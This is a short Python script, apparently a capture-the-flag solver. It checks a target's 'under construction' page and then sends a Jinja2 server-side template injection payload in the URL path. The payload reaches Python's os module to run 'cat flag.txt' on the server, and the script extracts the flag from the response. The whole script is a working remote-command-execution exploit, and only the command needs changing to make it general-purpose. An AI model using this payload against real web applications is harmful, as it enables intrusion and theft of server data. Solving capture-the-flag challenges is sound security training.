import requests
import argparse
import re

parser = argparse.ArgumentParser()
parser.add_argument('--host', type=str, required=True)
args = parser.parse_args()

def validate_host():
    r = requests.get(f'http://{args.host}')
    if r.text.find('Site still under construction') == -1:
        print(f'\tThe HOST {args.host} is not valid')
        exit(1)

def main():
    validate_host()
    payload = "{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}"
    r = requests.get(f'http://{args.host}/{payload}')
    flag = re.findall(r'<str[^>]*>([^<]+)</str>', r.text)
    print(f'\t🏁 The FLAG is {flag[0]}')
    exit(0)         

main()